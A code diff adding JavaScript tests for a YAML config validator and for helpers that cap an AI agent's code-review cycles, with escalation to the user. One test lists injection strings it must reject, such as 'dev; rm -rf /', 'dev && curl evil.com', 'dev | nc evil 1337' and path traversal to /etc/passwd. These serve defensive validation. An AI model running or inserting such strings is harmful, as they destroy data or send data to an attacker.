@@ -21,6 +21,20 @@ import {
   selectDiffMode,
   execFileWithInput,
   parseCodexReviewTail,
+  parseCodexReviewCycleMarkers,
+  evaluateCodexReviewCycleCap,
+  buildCodexReviewCycleMarker,
+  CODEX_REVIEW_HARD_CAP,
+  CODEX_REVIEW_CYCLE_MARKER_PREFIX,
+  parsePhaseMarkers,
+  evaluatePhasePrerequisite,
+  buildPhaseMarker,
+  PHASE_MARKER_PREFIX,
+  parseCodexVerifyCycleMarkers,
+  evaluateCodexVerifyCycleCap,
+  buildCodexVerifyCycleMarker,
+  CODEX_VERIFY_HARD_CAP,
+  CODEX_VERIFY_CYCLE_MARKER_PREFIX,
   dedupFindings,
   buildCodexVerifyPrompt,
   parseCodexVerifyTail,
@@ -318,6 +332,7 @@ describe("parseGroundControlYaml", () => {
       completion_command: null,
       lint_command: null,
       format_command: null,
+      base_branch: null,
     });
     assert.equal(result.value.sonarcloud, null);
     assert.equal(result.value.rules.plan_rules_path, null);
@@ -401,6 +416,53 @@ describe("parseGroundControlYaml", () => {
     const result = parseGroundControlYaml(yaml);
     assert.equal(result.ok, false);
     assert.ok(result.errors.some((e) => e.includes("workflow has unknown key")));
+  });
+
+  it("accepts safe workflow.base_branch values", () => {
+    for (const branch of ["dev", "main", "develop", "release/v1.2.3", "feature_x", "v2.x", "topic/sub-topic"]) {
+      const yaml = `schema_version: 1\nproject: x\nworkflow:\n  base_branch: ${branch}\n`;
+      const result = parseGroundControlYaml(yaml);
+      assert.equal(result.ok, true, `expected '${branch}' to be accepted but got: ${JSON.stringify(result.errors)}`);
+      assert.equal(result.value.workflow.base_branch, branch);
+    }
+  });
+
+  it("rejects workflow.base_branch with shell metacharacters or unsafe ref shapes", () => {
+    // Each entry is a shell-injection or git-check-ref-format violation that
+    // would be unsafe to render into `gh issue develop --base ...` etc.
+    // YAML-quoted so values like `dev; rm -rf /` parse as a single scalar.
+    const cases = [
+      "'dev; rm -rf /'", // command separator
+      "'dev && curl evil.com'", // command chain
+      "'dev | nc evil 1337'", // pipe to attacker
+      "'dev$(whoami)'", // command substitution
+      "'dev`whoami`'", // backtick substitution
+      "'dev > /tmp/x'", // redirection
+      "'../etc/passwd'", // path traversal in ref
+      "'/dev'", // leading slash
+      "'dev/'", // trailing slash
+      "'.dev'", // leading dot
+      "'dev.'", // trailing dot
+      "'dev.lock'", // .lock suffix
+      "'feat..ure'", // double-dot
+      "'feat//ure'", // double-slash
+      "'dev space'", // whitespace
+      "'dev~1'", // ~ disallowed by git
+      "'dev:foo'", // : disallowed by git
+      "'dev*'", // * disallowed by git
+      "'dev?'", // ? disallowed by git
+      "'dev[1]'", // [ disallowed by git
+      "'dev\\foo'", // backslash
+    ];
+    for (const value of cases) {
+      const yaml = `schema_version: 1\nproject: x\nworkflow:\n  base_branch: ${value}\n`;
+      const result = parseGroundControlYaml(yaml);
+      assert.equal(result.ok, false, `expected ${value} to be rejected`);
+      assert.ok(
+        result.errors.some((e) => e.includes("base_branch") && e.includes("safe Git ref name")),
+        `expected base_branch validation error for ${value}, got: ${JSON.stringify(result.errors)}`,
+      );
+    }
   });
 
   it("requires both sonarcloud fields when sonarcloud is set", () => {
@@ -493,6 +555,233 @@ describe("parseGroundControlYaml", () => {
     assert.equal(result.ok, false);
     assert.ok(result.errors.some((e) => e.includes("knowledge.schema must be a non-empty string")));
   });
+
+  // -------------------------------------------------------------------------
+  // ADR-027 schema additions: docs, example_paths, requirements,
+  // cross_cutting_concerns. All four are optional; absent block returns a
+  // null-shaped default so the canonical SKILL.md can fall back via
+  // {cfg.X|default Y} placeholders.
+  // -------------------------------------------------------------------------
+
+  it("returns null-shaped defaults when docs/example_paths/requirements/cross_cutting_concerns are absent", () => {
+    const result = parseGroundControlYaml("schema_version: 1\nproject: ground-control\n");
+    assert.equal(result.ok, true);
+    assert.deepEqual(result.value.docs, {
+      adr_dir: null,
+      architecture_overview: null,
+      coding_standards: null,
+      workflow_reference: null,
+      knowledge_base: null,
+    });
+    assert.deepEqual(result.value.example_paths, { source: null, test: null });
+    assert.deepEqual(result.value.requirements, { uid_examples: [] });
+    assert.deepEqual(result.value.cross_cutting_concerns, { description: null });
+  });
+
+  it("parses a fully populated docs block", () => {
+    const yaml = [
+      "schema_version: 1",
+      "project: ground-control",
+      "docs:",
+      "  adr_dir: architecture/adrs/",
+      "  architecture_overview: docs/architecture/ARCHITECTURE.md",
+      "  coding_standards: docs/CODING_STANDARDS.md",
+      "  workflow_reference: docs/DEVELOPMENT_WORKFLOW.md",
+      "  knowledge_base: docs/knowledge/",
+      "",
+    ].join("\n");
+    const result = parseGroundControlYaml(yaml);
+    assert.equal(result.ok, true);
+    assert.deepEqual(result.value.docs, {
+      adr_dir: "architecture/adrs/",
+      architecture_overview: "docs/architecture/ARCHITECTURE.md",
+      coding_standards: "docs/CODING_STANDARDS.md",
+      workflow_reference: "docs/DEVELOPMENT_WORKFLOW.md",
+      knowledge_base: "docs/knowledge/",
+    });
+  });
+
+  it("rejects unknown keys inside docs", () => {
+    const yaml = [
+      "schema_version: 1",
+      "project: ground-control",
+      "docs:",
+      "  bogus: nope",
+      "",
+    ].join("\n");
+    const result = parseGroundControlYaml(yaml);
+    assert.equal(result.ok, false);
+    assert.ok(result.errors.some((e) => e.includes("docs has unknown key 'bogus'")));
+  });
+
+  it("rejects docs when it is not a mapping", () => {
+    const yaml = [
+      "schema_version: 1",
+      "project: ground-control",
+      "docs:",
+      "  - not-a-mapping",
+      "",
+    ].join("\n");
+    const result = parseGroundControlYaml(yaml);
+    assert.equal(result.ok, false);
+    assert.ok(result.errors.some((e) => e.includes("docs must be a mapping")));
+  });
+
+  it("rejects an empty string for docs.adr_dir", () => {
+    const yaml = [
+      "schema_version: 1",
+      "project: ground-control",
+      "docs:",
+      "  adr_dir: ''",
+      "",
+    ].join("\n");
+    const result = parseGroundControlYaml(yaml);
+    assert.equal(result.ok, false);
+    assert.ok(result.errors.some((e) => e.includes("docs.adr_dir must be a non-empty string")));
+  });
+
+  it("parses a fully populated example_paths block", () => {
+    const yaml = [
+      "schema_version: 1",
+      "project: ground-control",
+      "example_paths:",
+      "  source: backend/src/main/java/com/keplerops/groundcontrol/",
+      "  test: backend/src/test/java/com/keplerops/groundcontrol/",
+      "",
+    ].join("\n");
+    const result = parseGroundControlYaml(yaml);
+    assert.equal(result.ok, true);
+    assert.deepEqual(result.value.example_paths, {
+      source: "backend/src/main/java/com/keplerops/groundcontrol/",
+      test: "backend/src/test/java/com/keplerops/groundcontrol/",
+    });
+  });
+
+  it("rejects unknown keys inside example_paths", () => {
+    const yaml = [
+      "schema_version: 1",
+      "project: ground-control",
+      "example_paths:",
+      "  source: src/",
+      "  bogus: src/",
+      "",
+    ].join("\n");
+    const result = parseGroundControlYaml(yaml);
+    assert.equal(result.ok, false);
+    assert.ok(result.errors.some((e) => e.includes("example_paths has unknown key 'bogus'")));
+  });
+
+  it("rejects example_paths when it is not a mapping", () => {
+    const yaml = [
+      "schema_version: 1",
+      "project: ground-control",
+      "example_paths: not-a-mapping",
+      "",
+    ].join("\n");
+    const result = parseGroundControlYaml(yaml);
+    assert.equal(result.ok, false);
+    assert.ok(result.errors.some((e) => e.includes("example_paths must be a mapping")));
+  });
+
+  it("parses a requirements block with uid_examples", () => {
+    const yaml = [
+      "schema_version: 1",
+      "project: ground-control",
+      "requirements:",
+      "  uid_examples:",
+      "    - GC-X001",
+      "    - OBS-042",
+      "",
+    ].join("\n");
+    const result = parseGroundControlYaml(yaml);
+    assert.equal(result.ok, true);
+    assert.deepEqual(result.value.requirements.uid_examples, ["GC-X001", "OBS-042"]);
+  });
+
+  it("rejects requirements.uid_examples when it is not a list", () => {
+    const yaml = [
+      "schema_version: 1",
+      "project: ground-control",
+      "requirements:",
+      "  uid_examples: GC-X001",
+      "",
+    ].join("\n");
+    const result = parseGroundControlYaml(yaml);
+    assert.equal(result.ok, false);
+    assert.ok(result.errors.some((e) => e.includes("requirements.uid_examples must be a list")));
+  });
+
+  it("rejects non-string entries in requirements.uid_examples", () => {
+    const yaml = [
+      "schema_version: 1",
+      "project: ground-control",
+      "requirements:",
+      "  uid_examples:",
+      "    - GC-X001",
+      "    - 42",
+      "",
+    ].join("\n");
+    const result = parseGroundControlYaml(yaml);
+    assert.equal(result.ok, false);
+    assert.ok(result.errors.some((e) => e.includes("requirements.uid_examples")));
+  });
+
+  it("rejects unknown keys inside requirements", () => {
+    const yaml = [
+      "schema_version: 1",
+      "project: ground-control",
+      "requirements:",
+      "  uid_examples: []",
+      "  bogus: true",
+      "",
+    ].join("\n");
+    const result = parseGroundControlYaml(yaml);
+    assert.equal(result.ok, false);
+    assert.ok(result.errors.some((e) => e.includes("requirements has unknown key 'bogus'")));
+  });
+
+  it("parses a cross_cutting_concerns description", () => {
+    const yaml = [
+      "schema_version: 1",
+      "project: ground-control",
+      "cross_cutting_concerns:",
+      "  description: |",
+      "    Logger: SLF4J via @Slf4j",
+      "    Validation: Bean Validation + Zod",
+      "",
+    ].join("\n");
+    const result = parseGroundControlYaml(yaml);
+    assert.equal(result.ok, true);
+    assert.ok(result.value.cross_cutting_concerns.description.includes("SLF4J"));
+    assert.ok(result.value.cross_cutting_concerns.description.includes("Bean Validation"));
+  });
+
+  it("rejects unknown keys inside cross_cutting_concerns", () => {
+    const yaml = [
+      "schema_version: 1",
+      "project: ground-control",
+      "cross_cutting_concerns:",
+      "  description: x",
+      "  bogus: y",
+      "",
+    ].join("\n");
+    const result = parseGroundControlYaml(yaml);
+    assert.equal(result.ok, false);
+    assert.ok(result.errors.some((e) => e.includes("cross_cutting_concerns has unknown key 'bogus'")));
+  });
+
+  it("rejects cross_cutting_concerns.description when empty", () => {
+    const yaml = [
+      "schema_version: 1",
+      "project: ground-control",
+      "cross_cutting_concerns:",
+      "  description: ''",
+      "",
+    ].join("\n");
+    const result = parseGroundControlYaml(yaml);
+    assert.equal(result.ok, false);
+    assert.ok(result.errors.some((e) => e.includes("cross_cutting_concerns.description must be a non-empty string")));
+  });
 });
 
 describe("getRepoGroundControlContext", () => {
@@ -529,6 +818,119 @@ describe("getRepoGroundControlContext", () => {
       assert.equal(result.rules.plan_rules_path, null);
       assert.equal(result.rules.plan_rules_content, null);
       assert.equal(result.knowledge, null);
+      // ADR-027 schema additions are returned even when absent (null-shaped defaults)
+      assert.deepEqual(result.docs, {
+        adr_dir: null,
+        architecture_overview: null,
+        coding_standards: null,
+        workflow_reference: null,
+        knowledge_base: null,
+      });
+      assert.deepEqual(result.example_paths, { source: null, test: null });
+      assert.deepEqual(result.requirements, { uid_examples: [] });
+      assert.deepEqual(result.cross_cutting_concerns, { description: null });
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it("returns the docs/example_paths/requirements/cross_cutting_concerns blocks when present", async () => {
+    const dir = makeTempRepo();
+    try {
+      // eslint-disable-next-line security/detect-non-literal-fs-filename -- test-controlled temp dir
+      writeFileSync(
+        join(dir, ".ground-control.yaml"),
+        [
+          "schema_version: 1",
+          "project: test-project",
+          "docs:",
+          "  adr_dir: architecture/adrs/",
+          "  coding_standards: docs/CODING_STANDARDS.md",
+          "example_paths:",
+          "  source: src/",
+          "  test: tests/",
+          "requirements:",
+          "  uid_examples: [\"X-001\", \"Y-002\"]",
+          "cross_cutting_concerns:",
+          "  description: Logger via pino",
+          "",
+        ].join("\n"),
+      );
+      const result = await getRepoGroundControlContext(dir);
+      assert.equal(result.status, "ok");
+      assert.equal(result.docs.adr_dir, "architecture/adrs/");
+      assert.equal(result.docs.coding_standards, "docs/CODING_STANDARDS.md");
+      assert.equal(result.example_paths.source, "src/");
+      assert.deepEqual(result.requirements.uid_examples, ["X-001", "Y-002"]);
+      assert.equal(result.cross_cutting_concerns.description, "Logger via pino");
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it("rejects an absolute docs.knowledge_base path", async () => {
+    const dir = makeTempRepo();
+    try {
+      // eslint-disable-next-line security/detect-non-literal-fs-filename -- test-controlled temp dir
+      writeFileSync(
+        join(dir, ".ground-control.yaml"),
+        [
+          "schema_version: 1",
+          "project: test-project",
+          "docs:",
+          "  knowledge_base: /etc/passwd",
+          "",
+        ].join("\n"),
+      );
+      const result = await getRepoGroundControlContext(dir);
+      assert.equal(result.status, "invalid_ground_control_yaml");
+      assert.ok(result.errors.some((e) => e.includes("docs.knowledge_base")));
+      assert.ok(result.errors.some((e) => e.includes("absolute path")));
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it("rejects a docs path that escapes the repo root via ..", async () => {
+    const dir = makeTempRepo();
+    try {
+      // eslint-disable-next-line security/detect-non-literal-fs-filename -- test-controlled temp dir
+      writeFileSync(
+        join(dir, ".ground-control.yaml"),
+        [
+          "schema_version: 1",
+          "project: test-project",
+          "docs:",
+          "  architecture_overview: ../../../etc/secrets",
+          "",
+        ].join("\n"),
+      );
+      const result = await getRepoGroundControlContext(dir);
+      assert.equal(result.status, "invalid_ground_control_yaml");
+      assert.ok(result.errors.some((e) => e.includes("docs.architecture_overview")));
+      assert.ok(result.errors.some((e) => e.includes("inside the repository root")));
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it("rejects an absolute example_paths.source path", async () => {
+    const dir = makeTempRepo();
+    try {
+      // eslint-disable-next-line security/detect-non-literal-fs-filename -- test-controlled temp dir
+      writeFileSync(
+        join(dir, ".ground-control.yaml"),
+        [
+          "schema_version: 1",
+          "project: test-project",
+          "example_paths:",
+          "  source: /usr/bin",
+          "",
+        ].join("\n"),
+      );
+      const result = await getRepoGroundControlContext(dir);
+      assert.equal(result.status, "invalid_ground_control_yaml");
+      assert.ok(result.errors.some((e) => e.includes("example_paths.source")));
     } finally {
       rmSync(dir, { recursive: true, force: true });
     }
@@ -1500,6 +1902,442 @@ describe("parseCodexVerifyTail", () => {
         ),
       /empty REPLY/,
     );
+  });
+});
+
+// ---------------------------------------------------------------------------
+// gc_codex_review hard-cap-2 enforcement (#794 MVP-1)
+// ---------------------------------------------------------------------------
+
+describe("parseCodexReviewCycleMarkers", () => {
+  it("returns 0 when no comments contain markers", () => {
+    const bodies = ["random comment", "another one", "## Codex review summary"];
+    assert.equal(parseCodexReviewCycleMarkers(bodies, 792), 0);
+  });
+
+  it("counts markers for the matching PR", () => {
+    const bodies = [
+      'first cycle: <!-- gc:codex-review-cycle cycle="1" pr="792" -->\n_done._',
+      "unrelated comment",
+      'second cycle: <!-- gc:codex-review-cycle cycle="2" pr="792" -->',
+    ];
+    assert.equal(parseCodexReviewCycleMarkers(bodies, 792), 2);
+  });
+
+  it("ignores markers for other PRs", () => {
+    const bodies = [
+      '<!-- gc:codex-review-cycle cycle="1" pr="100" -->',
+      '<!-- gc:codex-review-cycle cycle="1" pr="792" -->',
+      '<!-- gc:codex-review-cycle cycle="2" pr="999" -->',
+    ];
+    assert.equal(parseCodexReviewCycleMarkers(bodies, 792), 1);
+  });
+
+  it("tolerates non-string entries and a non-array input", () => {
+    assert.equal(parseCodexReviewCycleMarkers(["a", 42, null, undefined], 1), 0);
+    assert.equal(parseCodexReviewCycleMarkers(null, 1), 0);
+    assert.equal(parseCodexReviewCycleMarkers("not an array", 1), 0);
+  });
+
+  it("ignores malformed markers (missing pr=, missing cycle=, garbled)", () => {
+    const bodies = [
+      "<!-- gc:codex-review-cycle -->",
+      '<!-- gc:codex-review-cycle pr="792" -->', // no cycle attr
+      '<!-- gc:codex-review-cycle cycle="1" -->', // no pr attr
+      "<!-- gc:codex-review-cycle cycle=1 pr=792 -->", // unquoted (regex requires quotes)
+    ];
+    assert.equal(parseCodexReviewCycleMarkers(bodies, 792), 0);
+  });
+});
+
+describe("evaluateCodexReviewCycleCap", () => {
+  it("allows cycle 1 when no priors exist and surfaces a fix-and-push next_action", () => {
+    const result = evaluateCodexReviewCycleCap({ priorCount: 0, prNumber: 792 });
+    assert.equal(result.ok, true);
+    assert.equal(result.nextCycle, 1);
+    assert.equal(result.cap, CODEX_REVIEW_HARD_CAP);
+    assert.equal(result.next_action, "fix_all_findings_and_push");
+    assert.notEqual(result.override, true);
+  });
+
+  it("allows cycle 2 after one prior and signals the summarize-and-escalate discipline", () => {
+    const result = evaluateCodexReviewCycleCap({ priorCount: 1, prNumber: 792 });
+    assert.equal(result.ok, true);
+    assert.equal(result.nextCycle, 2);
+    // Cycle 2's next_action is the gap that #794 was filed to close — agents
+    // must fix all findings AND post a summary AND escalate, not stop early
+    // to ask whether to fix.
+    assert.equal(result.next_action, "fix_all_findings_then_summarize_and_escalate");
+  });
+
+  it("refuses cycle 3 (cap reached) and tells the agent what to do instead", () => {
+    const result = evaluateCodexReviewCycleCap({ priorCount: 2, prNumber: 792 });
+    assert.equal(result.ok, false);
+    assert.equal(result.error, "codex_review_cap_reached");
+    assert.equal(result.prior_cycles, 2);
+    assert.equal(result.cap, 2);
+    assert.equal(result.pr_number, 792);
+    assert.equal(result.next_action, "post_summary_and_escalate_to_user");
+    assert.match(result.message, /hard cap reached/);
+    assert.match(result.message, /escalate to the user/);
+    assert.match(result.message, /override_cap=true/);
+  });
+
+  it("refuses higher counts the same way (cap is a floor, not equality)", () => {
+    const result = evaluateCodexReviewCycleCap({ priorCount: 7, prNumber: 1 });
+    assert.equal(result.ok, false);
+    assert.equal(result.prior_cycles, 7);
+  });
+
+  it("respects an override hardCap (used by tests / future per-tool caps)", () => {
+    const allowed = evaluateCodexReviewCycleCap({ priorCount: 2, prNumber: 1, hardCap: 5 });
+    assert.equal(allowed.ok, true);
+    assert.equal(allowed.nextCycle, 3);
+    const refused = evaluateCodexReviewCycleCap({ priorCount: 5, prNumber: 1, hardCap: 5 });
+    assert.equal(refused.ok, false);
+    assert.equal(refused.cap, 5);
+  });
+
+  it("allows cycle 3 when overrideCap=true with a non-empty overrideReason", () => {
+    const result = evaluateCodexReviewCycleCap({
+      priorCount: 2,
+      prNumber: 792,
+      overrideCap: true,
+      overrideReason: "user said 'yes run cycle 3 to verify' on 2026-05-04",
+    });
+    assert.equal(result.ok, true);
+    assert.equal(result.override, true);
+    assert.equal(result.nextCycle, 3);
+    assert.match(result.override_reason, /yes run cycle 3 to verify/);
+  });
+
+  it("rejects overrideCap=true without an overrideReason (audit requirement)", () => {
+    const noReason = evaluateCodexReviewCycleCap({ priorCount: 2, prNumber: 1, overrideCap: true });
+    assert.equal(noReason.ok, false);
+    assert.equal(noReason.error, "codex_review_override_missing_reason");
+
+    const emptyReason = evaluateCodexReviewCycleCap({
+      priorCount: 2,
+      prNumber: 1,
+      overrideCap: true,
+      overrideReason: "   ",
+    });
+    assert.equal(emptyReason.ok, false);
+    assert.equal(emptyReason.error, "codex_review_override_missing_reason");
+  });
+
+  it("override applies even within the cap (allows arbitrary mid-flight overrides)", () => {
+    // A user could authorize a cycle even when the cap hasn't been reached
+    // yet (e.g., to skip ahead). The override path doesn't second-guess.
+    const result = evaluateCodexReviewCycleCap({
+      priorCount: 0,
+      prNumber: 792,
+      overrideCap: true,
+      overrideReason: "user wants cycle 1 marked as override for some reason",
+    });
+    assert.equal(result.ok, true);
+    assert.equal(result.override, true);
+    assert.equal(result.nextCycle, 1);
+  });
+
+  it("throws on garbage priorCount (defensive, surfaces a real bug rather than counting nothing)", () => {
+    assert.throws(() => evaluateCodexReviewCycleCap({ priorCount: -1, prNumber: 1 }));
+    assert.throws(() => evaluateCodexReviewCycleCap({ priorCount: NaN, prNumber: 1 }));
+    assert.throws(() => evaluateCodexReviewCycleCap({ priorCount: "1", prNumber: 1 }));
+  });
+});
+
+describe("buildCodexReviewCycleMarker", () => {
+  it("produces a marker that round-trips through parseCodexReviewCycleMarkers", () => {
+    const marker = buildCodexReviewCycleMarker({ prNumber: 792, cycleNumber: 1 });
+    assert.ok(marker.startsWith(CODEX_REVIEW_CYCLE_MARKER_PREFIX));
+    assert.equal(parseCodexReviewCycleMarkers([marker], 792), 1);
+  });
+
+  it("includes the cycle and cap in the human-readable body so reviewers see the count", () => {
+    const marker = buildCodexReviewCycleMarker({ prNumber: 100, cycleNumber: 2 });
+    assert.match(marker, /cycle 2 of 2/);
+    assert.match(marker, /PR #100/);
+    assert.match(marker, /issue #794/); // attribution to the enforcement issue
+  });
+
+  it("two markers from the same PR are both counted", () => {
+    const m1 = buildCodexReviewCycleMarker({ prNumber: 50, cycleNumber: 1 });
+    const m2 = buildCodexReviewCycleMarker({ prNumber: 50, cycleNumber: 2 });
+    assert.equal(parseCodexReviewCycleMarkers([m1, m2], 50), 2);
+    // and a marker for a different PR is not counted
+    const other = buildCodexReviewCycleMarker({ prNumber: 999, cycleNumber: 1 });
+    assert.equal(parseCodexReviewCycleMarkers([m1, m2, other], 50), 2);
+  });
+
+  it("renders an override marker distinguishable from regular cycle markers", () => {
+    const reason = 'user authorized cycle 3 to verify cycle-2 fixes';
+    const marker = buildCodexReviewCycleMarker({
+      prNumber: 792,
+      cycleNumber: 3,
+      override: true,
+      overrideReason: reason,
+    });
+    // Override markers carry override="true" and a quoted reason= attribute.
+    assert.match(marker, /override="true"/);
+    assert.match(marker, /reason="[^"]+"/);
+    assert.match(marker, /USER-AUTHORIZED OVERRIDE/);
+    assert.match(marker, new RegExp(reason));
+    // And they still round-trip through the cycle parser (so they count).
+    assert.equal(parseCodexReviewCycleMarkers([marker], 792), 1);
+  });
+
+  it("escapes quotes in override reasons so the comment HTML stays parseable", () => {
+    const tricky = 'user said "yes do it" then ran off';
+    const marker = buildCodexReviewCycleMarker({
+      prNumber: 1,
+      cycleNumber: 3,
+      override: true,
+      overrideReason: tricky,
+    });
+    // JSON.stringify escapes the embedded quotes; the marker must still
+    // contain the prefix and round-trip.
+    assert.match(marker, /reason="user said \\"yes do it\\" then ran off"/);
+    assert.equal(parseCodexReviewCycleMarkers([marker], 1), 1);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// gc_codex_verify_finding per-finding cap (#794 extension)
+// ---------------------------------------------------------------------------
+
+describe("parseCodexVerifyCycleMarkers", () => {
+  it("counts markers for the matching (PR, comment_id) pair", () => {
+    const bodies = [
+      '<!-- gc:codex-verify-cycle pr="792" comment="42" cycle="1" -->',
+      '<!-- gc:codex-verify-cycle pr="792" comment="42" cycle="2" -->',
+      '<!-- gc:codex-verify-cycle pr="792" comment="99" cycle="1" -->', // different finding
+    ];
+    assert.equal(parseCodexVerifyCycleMarkers(bodies, 792, 42), 2);
+    assert.equal(parseCodexVerifyCycleMarkers(bodies, 792, 99), 1);
+    assert.equal(parseCodexVerifyCycleMarkers(bodies, 792, 1000), 0);
+  });
+
+  it("ignores markers for other PRs even with the same comment_id", () => {
+    const bodies = [
+      '<!-- gc:codex-verify-cycle pr="100" comment="42" cycle="1" -->',
+      '<!-- gc:codex-verify-cycle pr="200" comment="42" cycle="1" -->',
+    ];
+    assert.equal(parseCodexVerifyCycleMarkers(bodies, 100, 42), 1);
+    assert.equal(parseCodexVerifyCycleMarkers(bodies, 200, 42), 1);
+    assert.equal(parseCodexVerifyCycleMarkers(bodies, 300, 42), 0);
+  });
+
+  it("tolerates non-string entries and a non-array input", () => {
+    assert.equal(parseCodexVerifyCycleMarkers(["a", 42, null], 1, 1), 0);
+    assert.equal(parseCodexVerifyCycleMarkers(null, 1, 1), 0);
+  });
+});
+
+describe("evaluateCodexVerifyCycleCap", () => {
+  it("allows cycle 1 with no priors and surfaces a fix-and-retry next_action", () => {
+    const result = evaluateCodexVerifyCycleCap({ priorCount: 0, prNumber: 792, commentId: 42 });
+    assert.equal(result.ok, true);
+    assert.equal(result.nextCycle, 1);
+    assert.equal(result.cap, CODEX_VERIFY_HARD_CAP);
+    assert.equal(result.next_action, "fix_finding_and_retry");
+  });
+
+  it("allows cycle 2 with one prior and signals the escalate-if-still-unresolved discipline", () => {
+    const result = evaluateCodexVerifyCycleCap({ priorCount: 1, prNumber: 792, commentId: 42 });
+    assert.equal(result.ok, true);
+    assert.equal(result.nextCycle, 2);
+    assert.equal(result.next_action, "fix_finding_then_escalate_if_still_unresolved");
+  });
+
+  it("refuses cycle 3 with structured error pointing at escalation", () => {
+    const result = evaluateCodexVerifyCycleCap({ priorCount: 2, prNumber: 792, commentId: 42 });
+    assert.equal(result.ok, false);
+    assert.equal(result.error, "codex_verify_cap_reached");
+    assert.equal(result.next_action, "escalate_finding_to_user");
+    assert.match(result.message, /comment #42/);
+    assert.match(result.message, /PR #792/);
+  });
+
+  it("override path requires a non-empty reason", () => {
+    const noReason = evaluateCodexVerifyCycleCap({
+      priorCount: 2,
+      prNumber: 1,
+      commentId: 1,
+      overrideCap: true,
+    });
+    assert.equal(noReason.ok, false);
+    assert.equal(noReason.error, "codex_verify_override_missing_reason");
+
+    const goodOverride = evaluateCodexVerifyCycleCap({
+      priorCount: 2,
+      prNumber: 1,
+      commentId: 1,
+      overrideCap: true,
+      overrideReason: "user said: try once more on this one",
+    });
+    assert.equal(goodOverride.ok, true);
+    assert.equal(goodOverride.override, true);
+    assert.equal(goodOverride.nextCycle, 3);
+  });
+
+  it("throws on garbage priorCount (defensive)", () => {
+    assert.throws(() => evaluateCodexVerifyCycleCap({ priorCount: -1, prNumber: 1, commentId: 1 }));
+  });
+});
+
+describe("buildCodexVerifyCycleMarker", () => {
+  it("round-trips through parseCodexVerifyCycleMarkers", () => {
+    const m = buildCodexVerifyCycleMarker({ prNumber: 792, commentId: 42, cycleNumber: 1 });
+    assert.ok(m.startsWith(CODEX_VERIFY_CYCLE_MARKER_PREFIX));
+    assert.equal(parseCodexVerifyCycleMarkers([m], 792, 42), 1);
+  });
+
+  it("override markers are distinguishable but still counted", () => {
+    const reason = "user authorized verify cycle 3 for this finding";
+    const m = buildCodexVerifyCycleMarker({
+      prNumber: 1,
+      commentId: 7,
+      cycleNumber: 3,
+      override: true,
+      overrideReason: reason,
+    });
+    assert.match(m, /override="true"/);
+    assert.match(m, /USER-AUTHORIZED OVERRIDE/);
+    assert.match(m, new RegExp(reason));
+    assert.equal(parseCodexVerifyCycleMarkers([m], 1, 7), 1);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Workflow phase markers (#794 MVP-2)
+// ---------------------------------------------------------------------------
+
+describe("parsePhaseMarkers", () => {
+  it("returns an empty Set when no comments contain markers", () => {
+    const phases = parsePhaseMarkers(["random", "comments", "here"], 791);
+    assert.ok(phases instanceof Set);
+    assert.equal(phases.size, 0);
+  });
+
+  it("collects each phase recorded for the matching issue", () => {
+    const bodies = [
+      '<!-- gc:phase phase="preflight" issue="791" -->\n_preflight done._',
+      "unrelated comment",
+      '<!-- gc:phase phase="plan" issue="791" -->',
+    ];
+    const phases = parsePhaseMarkers(bodies, 791);
+    assert.deepEqual([...phases].sort(), ["plan", "preflight"]);
+  });
+
+  it("ignores markers for other issues", () => {
+    const bodies = [
+      '<!-- gc:phase phase="preflight" issue="791" -->',
+      '<!-- gc:phase phase="plan" issue="100" -->',
+    ];
+    const phases = parsePhaseMarkers(bodies, 791);
+    assert.deepEqual([...phases], ["preflight"]);
+  });
+
+  it("treats duplicates as a single set entry", () => {
+    const bodies = [
+      '<!-- gc:phase phase="preflight" issue="50" -->',
+      'redundant: <!-- gc:phase phase="preflight" issue="50" -->',
+    ];
+    assert.equal(parsePhaseMarkers(bodies, 50).size, 1);
+  });
+
+  it("tolerates non-string entries and non-array input", () => {
+    assert.equal(parsePhaseMarkers(["a", 42, null, undefined], 1).size, 0);
+    assert.equal(parsePhaseMarkers(null, 1).size, 0);
+    assert.equal(parsePhaseMarkers("not an array", 1).size, 0);
+  });
+});
+
+describe("evaluatePhasePrerequisite", () => {
+  it("allows the next phase when all prerequisites are present", () => {
+    const result = evaluatePhasePrerequisite({
+      completed: new Set(["preflight"]),
+      nextPhase: "plan",
+      requires: ["preflight"],
+      issueNumber: 791,
+    });
+    assert.equal(result.ok, true);
+    assert.equal(result.next_phase, "plan");
+  });
+
+  it("refuses with a structured error when prerequisites are missing", () => {
+    const result = evaluatePhasePrerequisite({
+      completed: new Set(),
+      nextPhase: "plan",
+      requires: ["preflight"],
+      issueNumber: 791,
+    });
+    assert.equal(result.ok, false);
+    assert.equal(result.error, "phase_prerequisite_missing");
+    assert.equal(result.next_phase, "plan");
+    assert.deepEqual(result.missing, ["preflight"]);
+    assert.equal(result.issue_number, 791);
+    assert.match(result.message, /preflight/);
+    assert.match(result.message, /issue #791/);
+  });
+
+  it("handles multiple prerequisites and reports every missing one", () => {
+    const result = evaluatePhasePrerequisite({
+      completed: new Set(["preflight"]),
+      nextPhase: "review",
+      requires: ["preflight", "plan", "tdd"],
+      issueNumber: 1,
+    });
+    assert.equal(result.ok, false);
+    assert.deepEqual(result.missing.sort(), ["plan", "tdd"]);
+  });
+
+  it("treats requires=[] as 'no prerequisites' (allows unconditionally)", () => {
+    const result = evaluatePhasePrerequisite({
+      completed: new Set(),
+      nextPhase: "preflight",
+      requires: [],
+      issueNumber: 1,
+    });
+    assert.equal(result.ok, true);
+  });
+
+  it("throws on garbage input (defensive)", () => {
+    assert.throws(() =>
+      evaluatePhasePrerequisite({ completed: ["array, not Set"], nextPhase: "p", requires: [] }),
+    );
+    assert.throws(() =>
+      evaluatePhasePrerequisite({ completed: new Set(), nextPhase: "", requires: [] }),
+    );
+  });
+});
+
+describe("buildPhaseMarker", () => {
+  it("produces a marker that round-trips through parsePhaseMarkers", () => {
+    const marker = buildPhaseMarker({ phase: "preflight", issueNumber: 791 });
+    assert.ok(marker.startsWith(PHASE_MARKER_PREFIX));
+    const phases = parsePhaseMarkers([marker], 791);
+    assert.ok(phases.has("preflight"));
+  });
+
+  it("two different phases on the same issue both register", () => {
+    const m1 = buildPhaseMarker({ phase: "preflight", issueNumber: 1 });
